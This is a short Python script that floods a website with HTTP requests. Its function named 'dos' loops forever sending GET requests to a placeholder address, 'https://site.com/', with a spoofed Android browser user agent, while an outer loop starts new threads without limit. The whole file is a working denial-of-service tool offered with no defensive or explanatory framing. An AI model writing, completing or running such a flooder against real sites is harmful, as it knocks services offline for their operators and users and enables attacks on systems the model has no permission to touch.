# coding: utf8
import threading
import requests

user_agent = {"User-agent": "Mozilla/5.0 (Linux; Android 7.1.1; Nokia 2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.90 Mobile Safari/537.36"}

def dos():
	while True:
		requests.get("https://site.com/", headers = user_agent)

while True:
	threading.Thread(target=dos).start()

